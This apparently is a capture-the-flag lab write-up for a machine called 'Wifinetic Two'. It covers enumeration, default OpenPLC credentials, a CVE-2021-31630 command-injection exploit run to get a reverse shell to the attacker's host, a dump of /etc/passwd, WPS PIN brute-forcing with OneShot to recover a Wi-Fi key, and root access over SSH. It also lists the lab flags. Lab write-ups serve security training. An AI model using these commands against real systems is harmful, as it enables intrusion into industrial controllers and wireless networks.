@@ -1,0 +1,181 @@
+Wifinetic Two: Vulnerabilities: Default Credentials, directory traversal, CVE for RCE, and WPS brute-force
+
+Enumeration:
+sudo nmap -sC -sV -p- --min-rate=1000 10.129.200.53
+
+
+server: Werkzeug/1.0.1 Python/2.7.18
+
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+8080/tcp open  http-proxy Werkzeug/1.0.1 Python/2.7.18
+
+https://10.129.200.53:8080/ 
+
+gobuster dir -u https://10.129.200.53:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+
+
+http://10.129.200.53:8080/login 
+
+OpenPLC Webserver login page, let’s use burp suite to capture requests
+
+I searched this up on google:
+The default login for the OpenPLC web interface is both "openplc" for the username and password.
+
+We are able to login into the server, we are here: http://10.129.200.53:8080/dashboard 
+
+HTTP Request on dashboard
+GET /runtime_logs HTTP/1.1
+Host: 10.129.200.53:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://10.129.200.53:8080/dashboard
+DNT: 1
+Connection: close
+Cookie: session=.eJw9jzFvgzAUhP9K5bkDhrAgdUAytRzpPSuVEXpeopa4BQdTRBJBifLfa3XocMvpdHffnR0_Z3fpWHGdb-6ZHfsTK-7s6YMVjDbbodz3KF-DNpSCgJ02kFhPHEy54AZci5ZTQxx9mWIKO9iqhBo76AYHLQ9Z9LgNtqOgMivrVTeUYVCr9fWCosq1ePNRPYpyAfHFKVBuvcrBtD9kzgv4mkNziL0xb6q4qxLY1IrbaUCjMm1UjrJ-YY_4fXJzeB_deP2nuV3c_IfEvic3TkPLHr-EV06L.ZqPnIQ.T3Q4Bar77UXhu9X8byb9uIei1Yk
+Sec-GPC: 1
+
+http://10.129.200.53:8080/programs - This place lets us upload files onto the web server and when we click on an entry on the table, the request is: http://10.129.200.53:8080/reload-program?table_id=1 
+
+GET /reload-program?table_id=1 HTTP/1.1
+Host: 10.129.200.53:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://10.129.200.53:8080/programs
+DNT: 1
+Connection: close
+Cookie: session=.eJw9jzFvgzAUhP9K5bkDhrAgdUAytRzpPSuVEXpeopa4BQdTRBJBifLfa3XocMvpdHffnR0_Z3fpWHGdb-6ZHfsTK-7s6YMVjDbbodz3KF-DNpSCgJ02kFhPHEy54AZci5ZTQxx9mWIKO9iqhBo76AYHLQ9Z9LgNtqOgMivrVTeUYVCr9fWCosq1ePNRPYpyAfHFKVBuvcrBtD9kzgv4mkNziL0xb6q4qxLY1IrbaUCjMm1UjrJ-YY_4fXJzeB_deP2nuV3c_IfEvic3TkPLHr-EV06L.ZqPn1A.58_zVptFwtlS08KgFmG4hwXafS4
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-31630 
+Command Injection in Open PLC Webserver v3 allows remote attackers to execute arbitrary code via the "Hardware Layer Code Box" component on the "/hardware" page of the application.
+
+
+https://github.com/thewhiteh4t/cve-2021-31630 
+
+python cve_2021_31630.py -lh 10.10.14.217 -lp 4444 http://10.129.200.53:8080 
+
+
+cat user.txt
+f2efa683aa2a191417908b8db0d843ba
+
+
+root@attica01:/# cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+syslog:x:104:111::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+ubuntu:x:1000:1000::/home/ubuntu:/bin/bash
+
+
+Privilege Escalation:
+ 
+We need to crack the wireless interface
+
+iw dev wlan0 scan
+
+BSS 02:00:00:00:01:00(on wlan0)
+	last seen: 2059.868s [boottime]
+	TSF: 1722019020375405 usec (19930d, 18:37:00)
+	freq: 2412
+	beacon interval: 100 TUs
+	capability: ESS Privacy ShortSlotTime (0x0411)
+	signal: -30.00 dBm
+	last seen: 0 ms ago
+	Information elements from Probe Response frame:
+	SSID: plcrouter
+	Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 
+	DS Parameter set: channel 1
+	ERP: Barker_Preamble_Mode
+	Extended supported rates: 24.0 36.0 48.0 54.0 
+	RSN:	 * Version: 1
+		 * Group cipher: CCMP
+		 * Pairwise ciphers: CCMP
+		 * Authentication suites: PSK
+		 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
+	Supported operating classes:
+		 * current operating class: 81
+	Extended capabilities:
+		 * Extended Channel Switching
+		 * SSID List
+		 * Operating Mode Notification
+	WPS:	 * Version: 1.0
+		 * Wi-Fi Protected Setup State: 2 (Configured)
+		 * Response Type: 3 (AP)
+		 * UUID: 572cf82f-c957-5653-9b16-b5cfb298abf1
+		 * Manufacturer:  
+		 * Model:  
+		 * Model Number:  
+		 * Serial Number:  
+		 * Primary Device Type: 0-00000000-0
+		 * Device name:  
+		 * Config methods: Label, Display, Keypad
+		 * Version2: 2.0
+
+
+
+ Wireless WPS interfaces are susceptible to brute-force attacks via their pins
+
+https://github.com/kimocoder/OneShot 
+
+Get the python file over to target machine via curl
+python3 oneshot.py -i wlan0 -b 02:00:00:00:01:00 -K
+
+[*] Received WPS Message M7
+[+] WPS PIN: '12345670'
+[+] WPA PSK: 'NoWWEDoKnowWhaTisReal123!'
+[+] AP SSID: 'plcrouter'
+
+wpa_passphrase plcrouter NoWWEDoKnowWhaTisReal123! | sudo tee -a /etc/wpa_supplicant/wpa_supplicant.conf
+
+root@attica01:/opt/PLC/OpenPLC_v3/webserver# wpa_passphrase plcrouter NoWWEDoKnowWhaTisReal123! | sudo tee -a /etc/wpa_supplicant/wpa_supplicant.conf
+
+<sudo tee -a /etc/wpa_supplicant/wpa_supplicant.conf
+network={
+	ssid="plcrouter"
+	#psk="NoWWEDoKnowWhaTisReal123!"
+	psk=2bafe4e17630ef1834eaa9fa5c4d81fa5ef093c4db5aac5c03f1643fef02d156
+}
+
+sudo wpa_supplicant -B -i wlan0 -c /etc/wpa_supplicant/wpa_supplicant.conf
+	-tells wlan0 to use the configuration file that we modified above with sudo tee
+
+sudo ifconfig wlan0 192.168.1.7 netmask 255.255.255.0 up	
+	-set the wlan0 as up
+
+On the same reverse shell now, do ssh root@192.168.1.1 then we have root access
+
+
+root@ap:~# cat root.txt
+cat root.txt
+c5658966c95657fd0fa3bf0f6d54101a
